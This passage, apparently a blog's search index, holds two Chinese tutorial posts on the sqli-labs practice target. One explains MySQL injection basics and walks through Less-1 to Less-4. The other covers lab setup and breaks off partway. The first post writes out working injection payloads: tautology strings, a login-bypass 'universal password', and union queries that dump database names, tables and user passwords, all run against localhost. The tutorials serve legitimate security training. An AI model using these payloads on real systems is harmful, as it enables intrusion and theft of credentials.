<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-lab之第一章 基础知识</title>
      <link href="/2019/05/23/sqli-lab-zhi-di-yi-zhang-ji-chu-zhi-shi/"/>
      <url>/2019/05/23/sqli-lab-zhi-di-yi-zhang-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文内容参考了lcamry的mysql注入天书: <a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/category/846064.html</a></p><blockquote><p>在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用<code>拼接</code>的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的 时候，我们可以<strong>改变 sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的 <code>sql 注入</code></strong>。</p></blockquote><blockquote><p>本章将介绍一些 mysql 注入的一些基础知识, 可能知识有点多, 希望大家认真看一遍, 实操一遍.</p></blockquote><h2 id="学习篇"><a href="#学习篇" class="headerlink" title="学习篇"></a>学习篇</h2><h3 id="0x01-注入的分类"><a href="#0x01-注入的分类" class="headerlink" title="0x01 注入的分类"></a>0x01 注入的分类</h3><blockquote><p>下面这个是阿德玛表哥的总结的，现在理解不了可以跳过</p></blockquote><a id="more"></a><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190523110728.png" alt></p><h3 id="0x02-系统函数"><a href="#0x02-系统函数" class="headerlink" title="0x02 系统函数"></a>0x02 系统函数</h3><blockquote><p>这里介绍几个常用函数, 自己实操的话, 可以直接点击Kitematic的<code>EXEC</code>运行一个终端, 然后使用<code>mysql -uroot</code>进入mysql</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221135.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220924.png" alt></p><ol><li><p><code>version()</code>——MySQL 版本</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220935.png" alt></p></li><li><p><code>user()</code>——数据库用户名</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220946.png" alt></p></li><li><p><code>database()</code>——数据库名</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220956.png" alt></p></li><li><p><code>@@datadir</code>——数据库路径</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221008.png" alt></p></li><li><p><code>@@version_compile_os</code>——操作系统版本</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221018.png" alt></p></li></ol><h3 id="0x03-字符串连接函数"><a href="#0x03-字符串连接函数" class="headerlink" title="0x03 字符串连接函数"></a>0x03 字符串连接函数</h3><p>在select数据时, 我们往往需要将数据进行连接后进行回显. 很多的时候想将多个数据或者多行数据进行输出的时候, 需要使用字符串连接函数. 而在mysql中，常见的字符串连接函函数有<code>concat()</code>, <code>group_concat()</code>, <code>concat_ws()</code>.</p><p>举个例子, 不使用字符串连接函数时</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221028.png" alt></p><p>但是这里存在的一个问题是, 当使用union联合注入时, 我们都知道, 联合注入要求前后两个选择的列数要相同, 这里<code>id</code>, <code>username</code>是两个列, 当我们要一个列的时候, (即回显位只有一个)该怎么办? 这时候就需要用到字符串连接函数了</p><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>语法如下:</p><pre><code>concat(str1,str2,...)--没有分隔符地连接字符串--返回结果为连接参数产生的字符串--如有任何一个参数为NULL, 则返回值为 NULL--可以有一个或多个参数</code></pre><p>一般的我们都要用一个字符(这里是逗号)将各个项隔开, 便于数据的查看. 见下图:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221039.png" alt></p><p>下图是参数中有<code>NULL</code>的情况</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221048.png" alt></p><h4 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h4><p>语法如下:</p><pre><code>concat_ws(separator,str1,str2,...)--含有分隔符地连接字符串, 分隔符的位置会放在要连接的两个字符串之间--Separator为字符之间的分隔符, 可以是一个字符串, 也可以是其它参数--如果分隔符为 NULL, 则结果为 NULL--函数会忽略任何分隔符参数后的 NULL 值</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221058.png" alt></p><p>下图是忽略<code>NULL</code>的情况</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221110.png" alt></p><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>语法如下:</p><pre><code>group_concat(str1,str2,...)--连接一个组的所有字符串，并以`逗号`分隔每一条数据.</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221123.png" alt></p><h3 id="0x04-一般用于尝试的语句"><a href="#0x04-一般用于尝试的语句" class="headerlink" title="0x04 一般用于尝试的语句"></a>0x04 一般用于尝试的语句</h3><p>ps:<code>--+</code>可以用<code>#</code>替换，url 提交过程中 Url 编码后的<code>#</code>为<code>%23</code> </p><pre><code>or 1=1--+&#39;or 1=1--+&quot;or 1=1--+)or 1=1--+&#39;)or 1=1--+&quot;) or 1=1--+&quot;))or 1=1--+</code></pre><p><strong>一般的代码为</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre><p>此处考虑两个点</p><ol><li>一个是用一个单引号闭合前面的 <code>&#39;</code></li><li>另一个是处理后面的<code>&#39;</code>, 一般采用两种思路, <strong>闭合后面的引号或者注释掉</strong>，注释掉采用<code>--+</code> 或者 <code>#(%23)</code></li></ol><h3 id="0x05-union-操作符的介绍"><a href="#0x05-union-操作符的介绍" class="headerlink" title="0x05 union 操作符的介绍"></a>0x05 union 操作符的介绍</h3><p><strong><code>UNION</code> 操作符用于合并两个或多个 SELECT 语句的结果集</strong>。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p><h4 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL  UNION  语法"></a><code>SQL  UNION</code>  语法</h4><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name1 <span class="token keyword">UNION</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name2</code></pre><p>ps：默认地，<strong>UNION 操作符选取不同的值</strong>。如果<strong>允许重复的值，请使用 <code>UNION ALL</code></strong>。</p><h4 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL  UNION  ALL  语法"></a><code>SQL  UNION  ALL</code>  语法</h4><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name1 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name2</code></pre><p>另外，<code>UNION</code> 结果集中的列名总是等于 <code>UNION</code> 中第一个<code>SELECT</code>语句中的列名。</p><h3 id="0x06-sql-中的逻辑运算"><a href="#0x06-sql-中的逻辑运算" class="headerlink" title="0x06 sql 中的逻辑运算"></a>0x06 sql 中的逻辑运算</h3><blockquote><p>这里讨论一下逻辑运算的问题</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220749.png" alt></p><p>有一个问题 <code>elect * from users where id=1 and 1=1;</code> 这条语句为什么能够选择出<code>id=1</code> 的内容, <code>and 1=1</code> 到底起作用了没有? 这里就<strong>要清楚 sql 语句执行顺序</strong>了.</p><p>同时这个问题我们在使用<code>万能密码</code>的时候会用到</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'admin'</span></code></pre><p>我们可以用   <code>&#39;or 1=1#</code>  作为密码输入. 原因是为什么？</p><p>这里涉及到一个逻辑运算, 当使用上述所谓的万能密码后, 构成的 sql 语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#'</span></code></pre><p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句  <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>。三个条件用 <code>and</code> 和<code>or</code> 进行连接。在 sql 中，我们 <strong><code>and</code> 的运算优先级大于 <code>or</code> 的运算优先级</strong>。因此可以看到 第一个条件（用 <code>a</code> 表示）是真的，第二个条件（用<code>b</code> 表示）是假的，<code>a and  b = false</code>, 第一个条件和第二个条件执行 and 后是假，再与第三个条件 or 运算，因为第三个条件 <code>1=1</code> 是恒成立的，所以<strong>结果自然就为真</strong>了。因此上述的语句就是恒真了。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.0b6a1385urs_1534071271.png" alt></p><pre><code>(1) select * from users where id=1 and 1=1;(2) select * from users where id=1 &amp;&amp; 1=1;(3) select * from users where id=1 &amp; 1 =1;</code></pre><p>上述三者有什么区别？</p><ul><li>(1)和(2)是一样的，表达的意思是<code>id=1</code> 条件和 <code>1=1</code> 条件进行<code>与运算</code>。</li><li>(3)的意思是 <code>id=1</code> 条件与 <code>1</code> 进行<code>&amp;位操作</code>，<code>id=1</code> 被当作 <code>true</code>，与<code>1</code> 进行 <code>&amp; 运算</code> 结果还是 1， 再进行<code>=操作</code>，<code>1=1</code>,还是 1（ps：<strong><code>&amp;</code>的优先级大于<code>=</code></strong>）</li></ul><blockquote><p>Ps:此处进行的<code>位运算</code>。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从ascii 值反推回字符。（运用较少）</p></blockquote><h3 id="0x07-information-schema数据库"><a href="#0x07-information-schema数据库" class="headerlink" title="0x07 information.schema数据库"></a>0x07 information.schema数据库</h3><ul><li><p>现在做一些 mysql 的基本操作。启动 mysql，然后通过<strong>查询检查下数据库</strong>:</p><pre><code>  mysql -uroot  show databases;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215740.png" alt></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215844.png" alt></p></li><li><p>选择数据库</p><pre><code>  use 数据库名;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220804.png" alt></p></li><li><p>查看数据库中有哪些表</p><pre><code>  show tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220815.png" alt></p></li><li><p>查看指定表的结构</p><pre><code>  desc 表名;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220827.png" alt></p></li><li><p>接下来讨论下<strong>系统数据库</strong>，即<code>information_schema</code>。</p></li><li><p>首先说一下mysql的数据库<code>information_schema</code>，他是<code>系统数据库</code>，安装完就有，<strong>记录是当前数据库的数据库，表，列，用户权限</strong>等信息，下面说一下常用的几个表</p><ul><li><code>SCHEMATA</code>表:储存mysql<strong>所有数据库的基本信息</strong>，包括数据库名，编码类型路径等，<code>show databases</code>的结果取之此表。</li><li><code>TABLES</code>表:储存mysql中的<strong>表信息</strong>，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。<code>show tables from schemaname</code>的结果取之此表</li><li><code>COLUMNS</code>表：提供了<strong>表中的列信息</strong>，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是<code>show columns from schemaname.tablename</code>的结果取之此表。</li></ul></li></ul><pre><code>use information_schema;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220837.png" alt></p><ul><li><p>让我们来查看下表</p><pre><code>  show tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220857.png" alt></p></li><li><p>让我们来枚举这张表</p><pre><code>  desc tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127220140.png" alt></p></li><li><p>现在用下面的指令查询,一般手工注入使用这个查询，我们可以下载到表名。</p><pre><code>  select  table_name  from    information_schema.tables   where   table_schema    =   &quot;security&quot;;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220911.png" alt></p></li></ul><h3 id="0x08-注入流程"><a href="#0x08-注入流程" class="headerlink" title="0x08 注入流程"></a>0x08 注入流程</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t0hdn0hc41_1534071286.png" alt></p><ul><li><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是<strong>先拿到<code>数据库名</code>，在获取到当前数据库名下的<code>数据表</code>，再获取当前数据表下的<code>列</code>，最后获取<code>数据</code></strong>。</p></li><li><p>sql 有一个系统数据库<code>information_schema</code><strong>存储着所有的数据库的相关信息</strong>，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。</p><pre><code>  猜数据库  select schema_name from information_schema.schemata   猜某库的数据表  select table_name from information_schema.tables where table_schema=’xxxxx’  猜某表的所有列  Select column_name from information_schema.columns where table_name=’xxxxx’  获取某列的内容  Select *** from ****</code></pre></li></ul><h2 id="实战篇"><a href="#实战篇" class="headerlink" title="实战篇"></a>实战篇</h2><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><blockquote><p>为了方便学习查看，可以在源码中的<code>$sql</code>下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的）</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.3qo9vp3r8h6_1534071351.png" alt></p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"你的 sql 语句是："</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>  </code></pre><ul><li><p>在<code>http://localhost/sqli-labs/Less-1/?id=1</code>后面直接加上一个<code>&#39;</code>,看下效果:</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.cttq5aa2fpp_1534071365.png" alt></p></li><li><p>从上述错误当中，我们可以看到提交到 sql 中的 <code>&#39;</code>在经过 sql 语句构造后形成   <code>&#39;1&#39;&#39; LIMIT 0,1</code>， 多加了一个<code>’</code>,单引号都不匹配,这样拿去查询肯定报错啊 。这种方式就是<strong>从错误信息中得到我们所需要的信息</strong>，那我们接下来想如何将多余的 <code>&#39;</code> 去掉呢？</p><blockquote><p><code>limit</code>： 第一个参数是结果集中的第几个，跟C语言的数组的索引(<strong>从0开始</strong>)一致,<br>第二个参数就是个数<br>如 <code>limit  1,2</code>  :返回第二行和第三行，因为<strong>1表示是第二行，2表示行数个数是2</strong></p></blockquote></li><li><p>先尝试<code>&#39;or 1=1#</code>,<code>#</code>会将其后面的<code>&#39;</code>注释掉</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.qnnfatt1h5_1534071374.png" alt></p><p>  出了点问题，原来浏览器没帮我把<code>#</code><strong>url编码</strong>,可以将<code>#</code>换成<code>%23</code>,也可换成<code>--+</code>注释,<code>+</code>浏览器会编码成<code>空格</code></p><blockquote><p>常用url编码:空格是%20，单引号是%27， 井号是%23，双引号是%22</p></blockquote></li><li><p>尝试<code>&#39;or 1=1--+</code>,<code>--+</code>会将其后面的<code>&#39;</code>注释掉. 此时构造的 sql 语句就成了</p><pre><code>  SELECT * FROM users WHERE id=&#39;1&#39;or 1=1--+&#39; LIMIT 0,1</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.hh6v5xu38xh_1534071382.png" alt></p></li><li><p>可以看到正常返回数据。</p></li><li><p><strong>接下里就是利用 <code>order by</code>猜字段</strong>。<code>Order by</code> :<strong>对前面的数据进行排序</strong>，<strong>由phpMyadmin可以知道,这里有三列数据</strong>，我们就只能用<code>order by 3</code>,超过 3 就会报错。<code>‘order by 4--+</code>的结果显示结果超出。其实<strong>1表示第一个栏位,2表示第二栏位; 依此类推</strong></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.5ehddneepuu_1534071388.png" alt></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.p0r5eogj11_1534071395.png" alt></p></li><li><p>最后从源代码中分析下为什么会造成注入？Sql 语句为<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>; <code>id 参数</code>在拼接 sql 语句时，未对 id 进行任何的过滤等操作，所以当提交<code>&#39;or 1=1--+</code>，直接构造的 sql 语句就是</p><pre><code>  SELECT * FROM users WHERE id=’1’or 1=1-- ‘ LIMIT 0,1</code></pre><p>  这条语句因 <code>or 1=1</code> 所以为<strong>永恒真</strong>。</p></li><li><p>此外，此处介绍<code>union 联合注入</code>，<strong>union 的作用是将两个 sql 语句进行联合</strong>。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择<strong>列数要相同</strong>才可以。Union all 与 union 的区别是增加了<strong>去重</strong>的功能。我们这里根据上述 background 的知识，进行<code>information_schema</code> 知识的应用。</p><pre><code>  http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;union select 1,2--+</code></pre><p>  出现下图情况,说明两个sql语句列数不同</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.e8isiwe11qm_1534071400.png" alt></p><pre><code>  http://127.0.0.1/sqli-labs/Less-1/?id=-1’union select 1,2,3--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ge16dj62niu_1534071408.png" alt></p></li><li><p><strong>当 id 的数据在数据库中不存在时</strong>，（此时我们可以 让<code>id=-1</code>, 也可以让<code>id=1 and 1=2</code>, 两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，就会将后面的语句的内容显示出来,否则会显示存在id的内容）此处前台页面返回了我们构造的 <code>union</code> 的数据。</p></li><li><p>下面顺便看看id存在时的情况,所以要记住,记得要将id设置成一个不存在的值</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127222530.png" alt></p></li><li><p>下面就真正查询数据库的各种信息了（可以看到<strong>只有第2列和第3列的结果显示在网页上</strong>），所以我们就<strong>只能用<code>2和3</code>这两个位置了</strong>，但是两个位置应该是不够用的，这时我们就用到数据库的<code>连接函数</code>了，常用的就<code>concat</code>和<code>concat_ws</code>,其中<code>concat_ws</code>的第一个参数是连接字符串的<code>分隔符</code>，还会用到<code>group_concat</code>(可以把查询出来的多行连接起来)</p></li><li><p>简单复习怎么使用</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.n5l038hrrms_1534071415.png" alt></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.wox6raufzu_1534071426.png" alt></p><blockquote><p>再次强调<code>concat_ws</code>的一个参数是连接字符串的分隔符，这里很明显可以看到，但一般第一个参数一般都不是这样传过去的，因为会被html编码，要使用mysql的<code>char函数</code>将<strong>十进制</strong>ASCII码转化成字符，如下面的（<code>：</code>的十进制ASCII是<code>58</code>），当然这里的分隔符也可以多个字符</p></blockquote><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ifxxgq4eoi_1534071435.png" alt></p><p>  用的较多的就是这个啦，以后直接复制（<code>32</code>是<code>空格</code>的<code>十进制ASCII</code>）</p><pre><code>  concat_ws(char(32,58,32),user(),database(),version())    * user():返回当前数据库连接使用的用户  * database():返回当前数据库连接使用的数据库  * version():返回当前数据库的版本</code></pre></li><li><p><strong>爆数据库</strong></p><pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema  _name),3 from information_schema.schemata--+ LIMIT 0,1</code></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.z30b5fzkoib_1534071444.png" alt></p></li><li><p>暴<code>security</code>数据库的数据表</p><pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(table_n  ame),3 from information_schema.tables where table_schema=’security’--+ LIMIT 0,1</code></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.92t4b6c0djb_1534071453.png" alt></p></li><li><p>爆 users 表的列</p><pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column  _name),3 from information_schema.columns where table_name=’users’--+ LIMIT 0,1</code></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.uxni56mjox_1534071459.png" alt></p></li><li><p>爆数据</p><blockquote><p>最后那个id=2可以改成3,4,5… …</p></blockquote><pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,username,password from users where id=2--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,username,password f  rom users where id=2--+ LIMIT 0,1</code></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dxjasy45coi_1534071465.png" alt></p><blockquote><p>Less1-less4 都可以利用上述 <code>union 操作</code>进行注入。下面就不进行赘述了。</p></blockquote></li></ul><h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><ul><li><p>将<code>&#39;</code>（单引号）添加到数字中。</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.siv9brk0hg_1534071471.png" alt></p></li><li><p>我们又得到了一个 Mysql 返回的错误，提示我们语法错误。</p></li><li><p>现在执行的查询语句如下:</p><pre><code>  SELECT * FROM users WHERE id=1&#39; LIMIT 0,1</code></pre><p>  所以这里的<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，<strong>查询代码使用了整数。</strong></p><pre><code>  Select * from TABLE where id = (some integer value);</code></pre></li><li><p>现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以<strong>注释掉剩余的查询,看是否正确响应</strong></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.buo6091mrs_1534071478.png" alt></p></li><li><p>因此，源代码中可以分析到 SQL 语句为下：</p><pre><code>  $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></pre></li><li><p>可以成功注入的有：</p><pre><code>  or 1=1  or 1=1 --+</code></pre></li><li><p>其余的 payload 与 less1 中一样，只需要将 less1 中的<code>‘</code> 去掉即可。</p></li></ul><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><ul><li><p>首先加个单引号</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t2zwn6n8u9_1534071484.png" alt></p></li><li><p>可以看到报错那里出来了一个），原来这就是单引号注入的变形，那么我们在没有最终的sql语句的情况下怎么判断呢</p><p>  首先看到near和at之间的字符串<img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dx803xz4yl_1534071497.png" alt>，直接将左右的单引号去掉，那么就得到<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p><p>  我们明显看到<code>1</code>的右边多了一个<code>&#39;</code>这是似成相识的感觉吧，后面还有个<code>)</code>，那么对应于左边也应该有<code>(</code>，这里它意味着，开发者使用的查询是</p><pre><code>  SELECT * FROM users WHERE id=(&#39;our input here&#39;) LIMIT 0,1</code></pre></li><li><p>所以我们再用这样的代码来进行注入：</p><pre><code>  ?id=1&#39;)--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.4mpstb7m95g_1534071508.png" alt></p><p>  这样一来，我们便可以正常显示用户名和密码了，同时后面查询也已经被注释掉了。</p></li><li><p>在源代码中的 SQL 查询语句</p><pre><code>  $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre></li><li><p>可以成功注入的有：</p><pre><code>  &#39;) or &#39;1&#39;=(&#39;1    这里的意思是,不使用注释符号  &#39;) or 1=1--+     这里使用了注释符号</code></pre></li><li><p>其余的paylodad和less-1中的一样,只需要将less-1中的<code>&#39;</code>更换为<code>&#39;)</code>即可</p></li></ul><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><ul><li><p>我们使用<code>?id=1&quot;</code>,如下图</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538842923" alt></p></li><li><p>注入代码后，我们得到像这样的一个错误</p><pre><code>  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></pre></li><li><p>这里它意味着，代码当中对 id 参数进行了<code>&quot;&quot;</code> 和 <code>()</code> 的包装。 所以我们再用这样的代码来进行注入:</p><pre><code>  ?id=1&quot;)--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538843121" alt></p></li></ul><ul><li><p>这样一来，我们便可以得到用户名和密码了，同时后面查询也已经被注释掉了。 在源代码中的 SQL 查询语句，31 行</p><pre class=" language-SQL"><code class="language-SQL">  $sql="SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1";</code></pre></li><li><p>可以成功注入的有:</p><pre><code>  &quot;) or &quot;1&quot;=(&quot;1  &quot;) or 1=1--+</code></pre></li><li><p>其余的 payload 与 less1 中一样，只需要将 less1 中的<code>&#39;</code>更换为<code>&quot;)</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> sqli-lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-lab环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab之第零章 环境搭建</title>
      <link href="/2019/05/23/sqli-lab-zhi-di-ling-zhang-huan-jing-da-jian/"/>
      <url>/2019/05/23/sqli-lab-zhi-di-ling-zhang-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列教程的试验靶场为<code>sqli-labs</code> ,该靶场的下载地址为 <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> ,可以自行去下载,而装了<code>git</code>的童鞋也可以直接用下面的命令clone到随意的目录</p><pre><code>git clone https://github.com/Audi-1/sqli-labs</code></pre><p>因为写这个靶场的印度程序猿当年的php的版本小于7,用的是类似于<code>mysql_</code>的语句,而现在的php都是用类似于<code>mysqli_</code>.因此,如果现在搭建的环境使用的php版本大于7就会报错</p><p>接下来会从win10, docker下讨论该环境怎么搭建</p><a id="more"></a><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><blockquote><p>windows下推荐使用<code>phpstudy</code>,当然<code>wamp</code>也可以,只不过phpstudy更加方便,可以去这里下载安装: <a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">http://phpstudy.php.cn/</a></p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181218112400.png" alt></p><p>下载完成之后,我的phpstudy是安装在<code>D:\phpStudy</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181218112748.png" alt></p><p>然后打开phpstudy,类似如下界面,</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181218112942.png" alt></p><p>以下就是phpstudy启动成功的样子,两个大大的”绿点”</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.m6vjtgqeebm_1534071178.png" alt></p><p>phpStudy安装好之后, 将下载下来的<code>sqli-labs</code>复制到<code>WWW</code>文件夹下</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.6l5kfuyf925_1534071183.png" 